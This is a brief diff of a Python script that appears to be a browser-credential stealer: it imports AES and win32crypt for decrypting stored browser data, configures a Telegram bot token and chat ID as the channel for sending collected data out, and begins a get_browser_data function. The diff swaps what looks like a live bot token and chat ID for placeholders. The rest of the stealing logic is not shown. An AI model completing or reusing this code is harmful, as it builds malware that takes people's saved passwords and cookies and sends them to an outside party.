@@ -9,8 +9,8 @@ from Cryptodome.Cipher import AES
 from win32 import win32crypt
 
 # Конфигурация Telegram бота
-TELEGRAM_BOT_TOKEN = "7721048647:AAEmivp7nUHzYSdidS-tc9lsIUkNTS_F5g4"
-TELEGRAM_CHAT_ID = "7466584570"
+TELEGRAM_BOT_TOKEN = "TOKEN"
+TELEGRAM_CHAT_ID = "ID"
 
 def get_browser_data():
     collected_data = {}
